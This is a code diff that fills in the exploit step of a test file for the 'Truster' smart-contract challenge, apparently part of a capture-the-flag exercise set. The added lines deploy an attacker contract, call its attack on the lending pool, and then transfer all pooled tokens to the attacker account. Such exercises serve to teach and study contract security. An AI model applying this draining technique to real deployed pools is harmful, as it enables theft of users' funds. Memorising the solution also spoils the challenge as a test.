@@ -29,6 +29,23 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const TrusterAttacker = await ethers.getContractFactory('TrusterAttacker', attacker);
+        let hacker = await TrusterAttacker.deploy();
+        console.log("phase1");
+
+        await hacker.attack(this.pool.address, this.token.address, TOKENS_IN_POOL);
+        console.log("phase2");
+
+
+        // console.log(ethers.utils.formatEther(await this.token.allowance(this.pool.address, attacker.address)));
+        // console.log(ethers.utils.formatEther(TOKENS_IN_POOL));
+
+        // console.log(deployer.address);
+        // console.log(attacker.address);
+        // console.log(this.token.signer.address);
+        attackerToken = await this.token.connect(attacker);
+        console.log(attackerToken.signer.address);
+        await attackerToken.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
